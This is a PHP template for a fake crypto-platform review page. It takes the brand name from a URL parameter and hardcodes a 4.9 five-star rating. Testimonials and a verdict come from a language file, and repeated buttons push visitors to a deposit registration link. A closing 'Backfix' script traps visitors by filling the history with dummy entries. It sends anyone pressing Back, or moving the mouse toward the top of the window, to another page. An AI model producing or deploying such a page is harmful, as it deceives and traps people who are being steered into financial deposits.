<?php
// ============================================================
// NEWSNIK 1 — Review-Style Article Page
// Modeled after crypto-platform.reviews
// ============================================================

// 1. Include config
require_once __DIR__ . '/../config.php';

// 2. Read query params
$lang  = get_active_lang($offer_lang, isset($_GET['lang']) ? $_GET['lang'] : null);
$brand_name_param = isset($_GET['brand']) ? trim($_GET['brand']) : $brand_name;

// 3. Include lang.php
require_once __DIR__ . '/lang.php';

// 4. Get translations for active language
$t = isset($content[$lang]) ? $content[$lang] : $content['en'];

// 5. Replace placeholders
function replace_placeholders($val, $brand, $min_dep, $dep_cur) {
    if (is_string($val)) {
        $val = str_replace('{{BRAND}}', $brand, $val);
        $val = str_replace('{{MIN_DEPOSIT}}', $min_dep, $val);
        $val = str_replace('{{DEPOSIT_CURRENCY}}', $dep_cur, $val);
        return $val;
    }
    if (is_array($val)) {
        foreach ($val as $k => $v) {
            $val[$k] = replace_placeholders($v, $brand, $min_dep, $dep_cur);
        }
        return $val;
    }
    return $val;
}

$t = replace_placeholders($t, $brand_name_param, $min_deposit, $deposit_currency);
$page_brand = htmlspecialchars($brand_name_param);
$reg_url    = htmlspecialchars($offer_register_url);
$site_name  = htmlspecialchars($newsnik1_domain);
?>
<!DOCTYPE html>
<html lang="<?php echo $lang; ?>">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($t['page_title']); ?></title>
    <meta name="description" content="<?php echo htmlspecialchars($t['meta_desc']); ?>">
    <meta name="robots" content="noindex, nofollow">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/lipis/flag-icons@7.0.0/css/flag-icons.min.css">
    <?php if (!empty($offer_favicon)): ?>
    <link rel="icon" href="<?php echo htmlspecialchars($offer_favicon); ?>">
    <?php endif; ?>
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #1c2129;
            --border-color: #30363d;
            --text-primary: #e6edf3;
            --text-secondary: #8b949e;
            --text-muted: #6e7681;
            --accent-green: #2ea043;
            --accent-green-hover: #3fb950;
            --accent-green-glow: rgba(46, 160, 67, 0.25);
            --star-gold: #fbbc05;
            --pro-green: #2ea043;
            --con-red: #f85149;
            --link-blue: #58a6ff;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background-color: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.7;
            font-size: 15px;
        }

        a { color: var(--link-blue); text-decoration: none; transition: color 0.2s; }
        a:hover { color: #79c0ff; }

        /* Navbar */
        .navbar-custom {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            padding: 0.75rem 0;
        }
        .navbar-custom .navbar-brand {
            font-weight: 700;
            font-size: 1.2rem;
            color: var(--text-primary);
            letter-spacing: -0.02em;
        }
        .navbar-custom .nav-link {
            color: var(--text-secondary);
            font-size: 0.9rem;
            font-weight: 500;
            padding: 0.5rem 1rem;
            transition: color 0.2s;
        }
        .navbar-custom .nav-link:hover { color: var(--text-primary); }

        /* Breadcrumbs */
        .breadcrumb-section {
            background: var(--bg-secondary);
            border-bottom: 1px solid var(--border-color);
            padding: 0.6rem 0;
        }
        .breadcrumb-section .breadcrumb {
            margin-bottom: 0;
            font-size: 0.82rem;
        }
        .breadcrumb-section .breadcrumb-item a { color: var(--text-secondary); }
        .breadcrumb-section .breadcrumb-item.active { color: var(--text-muted); }
        .breadcrumb-section .breadcrumb-item + .breadcrumb-item::before {
            color: var(--text-muted);
        }

        /* Hero */
        .hero-section {
            background: linear-gradient(135deg, #0d1117 0%, #161b22 40%, #1a2332 70%, #0d1117 100%);
            border-bottom: 1px solid var(--border-color);
            padding: 3.5rem 0 3rem;
            position: relative;
            overflow: hidden;
        }
        .hero-section::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(ellipse at 30% 50%, rgba(46,160,67,0.06) 0%, transparent 60%);
            pointer-events: none;
        }
        .hero-brand {
            font-size: 2.5rem;
            font-weight: 800;
            letter-spacing: -0.03em;
            margin-bottom: 1rem;
            line-height: 1.2;
        }
        .hero-brand .tm { font-size: 0.5em; vertical-align: super; color: var(--text-secondary); }
        .verdict-badge {
            display: inline-flex;
            align-items: center;
            gap: 0.4rem;
            background: rgba(46, 160, 67, 0.15);
            border: 1px solid rgba(46, 160, 67, 0.3);
            color: var(--accent-green-hover);
            padding: 0.35rem 1rem;
            border-radius: 50px;
            font-size: 0.85rem;
            font-weight: 600;
            margin-bottom: 1rem;
        }
        .verdict-badge svg { width: 16px; height: 16px; fill: currentColor; }
        .star-rating {
            display: flex;
            align-items: center;
            gap: 0.3rem;
            margin-bottom: 0.5rem;
        }
        .star { color: var(--star-gold); font-size: 1.3rem; }
        .rating-num { font-size: 1.5rem; font-weight: 700; margin-right: 0.5rem; }
        .rating-count { color: var(--text-secondary); font-size: 0.85rem; }

        /* CTA Button */
        .cta-btn {
            display: inline-block;
            background: var(--accent-green);
            color: #fff;
            font-weight: 600;
            font-size: 1rem;
            padding: 0.85rem 2rem;
            border-radius: 8px;
            border: none;
            cursor: pointer;
            transition: all 0.25s ease;
            text-decoration: none;
            box-shadow: 0 0 20px var(--accent-green-glow);
        }
        .cta-btn:hover {
            background: var(--accent-green-hover);
            color: #fff;
            transform: translateY(-2px);
            box-shadow: 0 4px 25px var(--accent-green-glow);
        }

        /* Content */
        .content-section { padding: 3rem 0; }

        .content-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.8rem;
            margin-bottom: 1.5rem;
        }

        .content-card h2 {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 1rem;
            letter-spacing: -0.02em;
        }
        .content-card h3 {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 0.8rem;
        }
        .content-card p {
            color: var(--text-secondary);
            margin-bottom: 1rem;
        }

        /* Pros/Cons */
        .pros-cons-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
        @media (max-width: 768px) { .pros-cons-grid { grid-template-columns: 1fr; } }
        .pros-card, .cons-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.5rem;
        }
        .pros-card { border-top: 3px solid var(--pro-green); }
        .cons-card { border-top: 3px solid var(--con-red); }
        .pros-card h3 { color: var(--pro-green); }
        .cons-card h3 { color: var(--con-red); }
        .pros-card li, .cons-card li {
            color: var(--text-secondary);
            padding: 0.4rem 0;
            list-style: none;
            position: relative;
            padding-left: 1.5rem;
        }
        .pros-card li::before {
            content: '✓';
            position: absolute;
            left: 0;
            color: var(--pro-green);
            font-weight: 700;
        }
        .cons-card li::before {
            content: '✗';
            position: absolute;
            left: 0;
            color: var(--con-red);
            font-weight: 700;
        }

        /* Features Grid */
        .features-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1rem;
        }
        @media (max-width: 768px) { .features-grid { grid-template-columns: 1fr; } }
        .feature-card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 1.5rem;
            transition: border-color 0.25s, transform 0.25s;
        }
        .feature-card:hover {
            border-color: var(--accent-green);
            transform: translateY(-2px);
        }
        .feature-icon { font-size: 2rem; margin-bottom: 0.75rem; }
        .feature-card h4 {
            font-size: 1rem;
            font-weight: 600;
            margin-bottom: 0.5rem;
        }
        .feature-card p {
            color: var(--text-secondary);
            font-size: 0.88rem;
            margin-bottom: 0;
        }

        /* Steps */
        .step-item {
            display: flex;
            gap: 1.2rem;
            margin-bottom: 1.5rem;
            align-items: flex-start;
        }
        .step-num {
            flex-shrink: 0;
            width: 42px;
            height: 42px;
            background: var(--accent-green);
            color: #fff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: 700;
            font-size: 1.1rem;
        }
        .step-content h4 { font-size: 1.05rem; font-weight: 600; margin-bottom: 0.3rem; }
        .step-content p { color: var(--text-secondary); font-size: 0.9rem; margin-bottom: 0; }

        /* Testimonials */
        .testimonial-card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 10px;
            padding: 1.5rem;
            margin-bottom: 1rem;
        }
        .testimonial-header {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 0.75rem;
        }
        .testimonial-header .fi {
            font-size: 1.3rem;
            border-radius: 3px;
            box-shadow: 0 1px 3px rgba(0,0,0,0.3);
        }
        .testimonial-name { font-weight: 600; font-size: 0.95rem; }
        .testimonial-stars { color: var(--star-gold); font-size: 0.9rem; }
        .testimonial-text {
            color: var(--text-secondary);
            font-style: italic;
            font-size: 0.92rem;
            line-height: 1.6;
        }

        /* FAQ Accordion */
        .faq-accordion .accordion-item {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px !important;
            margin-bottom: 0.5rem;
        }
        .faq-accordion .accordion-button {
            background: var(--bg-secondary);
            color: var(--text-primary);
            font-weight: 500;
            font-size: 0.95rem;
            border-radius: 8px !important;
            box-shadow: none;
            padding: 1rem 1.25rem;
        }
        .faq-accordion .accordion-button:not(.collapsed) {
            background: var(--bg-tertiary);
            color: var(--accent-green-hover);
        }
        .faq-accordion .accordion-button::after {
            filter: invert(0.6);
        }
        .faq-accordion .accordion-body {
            color: var(--text-secondary);
            font-size: 0.9rem;
            padding: 0.75rem 1.25rem 1rem;
        }

        /* Sidebar */
        .sidebar-card {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 1.5rem;
            position: sticky;
            top: 1.5rem;
        }
        .sidebar-card h3 {
            font-size: 1.15rem;
            font-weight: 700;
            margin-bottom: 1.2rem;
            padding-bottom: 0.75rem;
            border-bottom: 1px solid var(--border-color);
        }
        .sidebar-fact {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 0.6rem 0;
            border-bottom: 1px solid rgba(48, 54, 61, 0.5);
            font-size: 0.88rem;
        }
        .sidebar-fact:last-of-type { border-bottom: none; }
        .sidebar-fact-label { color: var(--text-secondary); }
        .sidebar-fact-value { font-weight: 600; text-align: right; }
        .sidebar-rating-stars { color: var(--star-gold); }

        /* Verdict */
        .verdict-section {
            background: linear-gradient(135deg, rgba(46,160,67,0.08) 0%, rgba(46,160,67,0.02) 100%);
            border: 1px solid rgba(46,160,67,0.2);
            border-radius: 12px;
            padding: 2rem;
            text-align: center;
        }
        .verdict-section h2 { margin-bottom: 1rem; }
        .verdict-section p { color: var(--text-secondary); max-width: 700px; margin: 0 auto 1.5rem; }

        /* Footer */
        .footer-section {
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
            padding: 2rem 0;
            margin-top: 3rem;
        }
        .footer-disclaimer {
            color: var(--text-muted);
            font-size: 0.78rem;
            line-height: 1.6;
            max-width: 800px;
        }
        .footer-copy {
            color: var(--text-muted);
            font-size: 0.78rem;
            margin-top: 1rem;
        }

        /* Animations */
        @keyframes fadeInUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .animate-in {
            animation: fadeInUp 0.5s ease forwards;
            opacity: 0;
        }
        .delay-1 { animation-delay: 0.1s; }
        .delay-2 { animation-delay: 0.2s; }
        .delay-3 { animation-delay: 0.3s; }
    </style>
</head>
<body>

<!-- Navbar -->
<nav class="navbar navbar-expand-lg navbar-custom">
    <div class="container">
        <a class="navbar-brand" href="#"><?php echo $site_name; ?></a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarNav">
            <ul class="navbar-nav ms-auto">
                <li class="nav-item"><a class="nav-link" href="#"><?php echo htmlspecialchars($t['nav_home']); ?></a></li>
                <li class="nav-item"><a class="nav-link" href="#"><?php echo htmlspecialchars($t['nav_reviews']); ?></a></li>
            </ul>
        </div>
    </div>
</nav>

<!-- Breadcrumbs -->
<div class="breadcrumb-section">
    <div class="container">
        <nav aria-label="breadcrumb">
            <ol class="breadcrumb">
                <li class="breadcrumb-item"><a href="#"><?php echo htmlspecialchars($t['breadcrumb_home']); ?></a></li>
                <li class="breadcrumb-item"><a href="#"><?php echo htmlspecialchars($t['breadcrumb_reviews']); ?></a></li>
                <li class="breadcrumb-item active" aria-current="page"><?php echo $page_brand; ?></li>
            </ol>
        </nav>
    </div>
</div>

<!-- Hero Section -->
<section class="hero-section">
    <div class="container">
        <div class="row align-items-center">
            <div class="col-lg-8">
                <div class="verdict-badge animate-in">
                    <svg viewBox="0 0 16 16"><path d="M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM6.97 11.03a.75.75 0 0 0 1.07 0l3.992-3.992a.75.75 0 0 0-1.071-1.071L7.477 9.417 5.384 7.323a.75.75 0 0 0-1.071 1.071L6.97 11.03z"/></svg>
                    <?php echo htmlspecialchars($t['hero_verdict']); ?>
                </div>
                <h1 class="hero-brand animate-in delay-1">
                    <?php echo $page_brand; ?><span class="tm">™</span>
                </h1>
                <div class="star-rating animate-in delay-2">
                    <span class="rating-num">4.9</span>
                    <span class="star">★</span>
                    <span class="star">★</span>
                    <span class="star">★</span>
                    <span class="star">★</span>
                    <span class="star">★</span>
                    <span class="rating-count">(<?php echo htmlspecialchars($t['hero_rating_count']); ?>)</span>
                </div>
                <a href="<?php echo $reg_url; ?>" class="cta-btn animate-in delay-3" rel="nofollow noopener" target="_blank">
                    <?php echo htmlspecialchars($t['hero_cta']); ?> →
                </a>
            </div>
        </div>
    </div>
</section>

<!-- Main Content -->
<section class="content-section">
    <div class="container">
        <div class="row">

            <!-- Main Column -->
            <div class="col-lg-8">

                <!-- Overview -->
                <div class="content-card">
                    <p><?php echo nl2br(htmlspecialchars($t['overview'])); ?></p>
                </div>

                <!-- What Is -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['what_is_title']); ?></h2>
                    <p><?php echo nl2br(htmlspecialchars($t['what_is_text'])); ?></p>
                </div>

                <!-- How It Works -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['how_works_title']); ?></h2>
                    <p><?php echo nl2br(htmlspecialchars($t['how_works_text'])); ?></p>
                </div>

                <!-- Pros/Cons -->
                <div class="pros-cons-grid" style="margin-bottom: 1.5rem;">
                    <div class="pros-card">
                        <h3>✓ <?php echo htmlspecialchars($t['pros_title']); ?></h3>
                        <ul>
                            <?php foreach ($t['pros'] as $pro): ?>
                            <li><?php echo htmlspecialchars($pro); ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                    <div class="cons-card">
                        <h3>✗ <?php echo htmlspecialchars($t['cons_title']); ?></h3>
                        <ul>
                            <?php foreach ($t['cons'] as $con): ?>
                            <li><?php echo htmlspecialchars($con); ?></li>
                            <?php endforeach; ?>
                        </ul>
                    </div>
                </div>

                <!-- Features -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['features_title']); ?></h2>
                    <div class="features-grid" style="margin-top: 1rem;">
                        <?php foreach ($t['features'] as $feat): ?>
                        <div class="feature-card">
                            <div class="feature-icon"><?php echo $feat['icon']; ?></div>
                            <h4><?php echo htmlspecialchars($feat['title']); ?></h4>
                            <p><?php echo htmlspecialchars($feat['desc']); ?></p>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <!-- Getting Started -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['steps_title']); ?></h2>
                    <?php foreach ($t['steps'] as $i => $step): ?>
                    <div class="step-item">
                        <div class="step-num"><?php echo $i + 1; ?></div>
                        <div class="step-content">
                            <h4><?php echo htmlspecialchars($step['title']); ?></h4>
                            <p><?php echo htmlspecialchars($step['desc']); ?></p>
                        </div>
                    </div>
                    <?php endforeach; ?>
                </div>

                <!-- Testimonials -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['testimonials_title']); ?></h2>
                    <?php foreach ($t['testimonials'] as $test): ?>
                    <div class="testimonial-card">
                        <div class="testimonial-header">
                            <span class="fi fi-<?php echo htmlspecialchars($test['flag']); ?>"></span>
                            <span class="testimonial-name"><?php echo htmlspecialchars($test['name']); ?></span>
                            <span class="testimonial-stars">
                                <?php echo str_repeat('★', $test['rating']); ?>
                            </span>
                        </div>
                        <div class="testimonial-text"><?php echo htmlspecialchars($test['text']); ?></div>
                    </div>
                    <?php endforeach; ?>
                </div>

                <!-- FAQ -->
                <div class="content-card">
                    <h2><?php echo htmlspecialchars($t['faq_title']); ?></h2>
                    <div class="accordion faq-accordion" id="faqAccordion">
                        <?php foreach ($t['faqs'] as $fi => $faq): ?>
                        <div class="accordion-item">
                            <h3 class="accordion-header" id="faqHead<?php echo $fi; ?>">
                                <button class="accordion-button <?php echo $fi > 0 ? 'collapsed' : ''; ?>"
                                        type="button" data-bs-toggle="collapse"
                                        data-bs-target="#faqBody<?php echo $fi; ?>"
                                        aria-expanded="<?php echo $fi === 0 ? 'true' : 'false'; ?>">
                                    <?php echo htmlspecialchars($faq['q']); ?>
                                </button>
                            </h3>
                            <div id="faqBody<?php echo $fi; ?>"
                                 class="accordion-collapse collapse <?php echo $fi === 0 ? 'show' : ''; ?>"
                                 data-bs-parent="#faqAccordion">
                                <div class="accordion-body"><?php echo htmlspecialchars($faq['a']); ?></div>
                            </div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>

                <!-- Final Verdict -->
                <div class="verdict-section">
                    <h2><?php echo htmlspecialchars($t['verdict_title']); ?></h2>
                    <div class="star-rating" style="justify-content: center; margin-bottom: 1rem;">
                        <span class="rating-num">4.9</span>
                        <span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span><span class="star">★</span>
                    </div>
                    <p><?php echo nl2br(htmlspecialchars($t['verdict_text'])); ?></p>
                    <a href="<?php echo $reg_url; ?>" class="cta-btn" rel="nofollow noopener" target="_blank">
                        <?php echo htmlspecialchars($t['verdict_cta']); ?> →
                    </a>
                </div>

            </div>

            <!-- Sidebar -->
            <div class="col-lg-4">
                <div class="sidebar-card">
                    <h3><?php echo htmlspecialchars($t['sidebar_title']); ?></h3>

                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_rating']); ?></span>
                        <span class="sidebar-fact-value">
                            <span class="sidebar-rating-stars">★★★★★</span> 4.9/5
                        </span>
                    </div>
                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_min_deposit']); ?></span>
                        <span class="sidebar-fact-value"><?php echo htmlspecialchars($min_deposit . ' ' . $deposit_currency); ?></span>
                    </div>
                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_currencies']); ?></span>
                        <span class="sidebar-fact-value">BTC, ETH, XRP +</span>
                    </div>
                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_mobile']); ?></span>
                        <span class="sidebar-fact-value"><?php echo htmlspecialchars($t['sidebar_mobile_val']); ?></span>
                    </div>
                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_withdrawal']); ?></span>
                        <span class="sidebar-fact-value"><?php echo htmlspecialchars($t['sidebar_withdrawal_val']); ?></span>
                    </div>
                    <div class="sidebar-fact">
                        <span class="sidebar-fact-label"><?php echo htmlspecialchars($t['sidebar_support']); ?></span>
                        <span class="sidebar-fact-value"><?php echo htmlspecialchars($t['sidebar_support_val']); ?></span>
                    </div>

                    <div style="margin-top: 1.5rem; text-align: center;">
                        <a href="<?php echo $reg_url; ?>" class="cta-btn" style="width: 100%; display: block;" rel="nofollow noopener" target="_blank">
                            <?php echo htmlspecialchars($t['hero_cta']); ?> →
                        </a>
                    </div>
                </div>
            </div>

        </div>
    </div>
</section>

<!-- Footer -->
<footer class="footer-section">
    <div class="container">
        <p class="footer-disclaimer"><?php echo htmlspecialchars($t['footer_disclaimer']); ?></p>
        <p class="footer-copy">&copy; <?php echo date('Y'); ?> <?php echo $site_name; ?>. All rights reserved.</p>
    </div>
</footer>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

<!-- Backfix redirect script (Ravelizio Version) -->
<script>
(function() {
    var searchParams = new URLSearchParams(window.location.search);
    var lang = searchParams.get('lang') || 'en';
    var targetUrl = '../google.php?lang=' + lang;
    var activated = false;

    function activateBackBlock() {
        if (activated) return;
        activated = true;
        for (var i = 0; i < 15; i++) {
            history.pushState(null, document.title, location.href);
        }
        window.addEventListener('popstate', function() {
            setTimeout(function() {
                location.replace(targetUrl);
            }, 1);
        });
    }

    document.addEventListener('click', activateBackBlock, { once: true });
    window.addEventListener('scroll', function() {
        if (window.scrollY > 30) {
            activateBackBlock();
        }
    }, { once: true });
    setTimeout(activateBackBlock, 3000);

    document.addEventListener('mouseleave', function(e) {
        if (e.clientY < 20) {
            location.replace(targetUrl);
        }
    });
})();
</script>

</body>
</html>
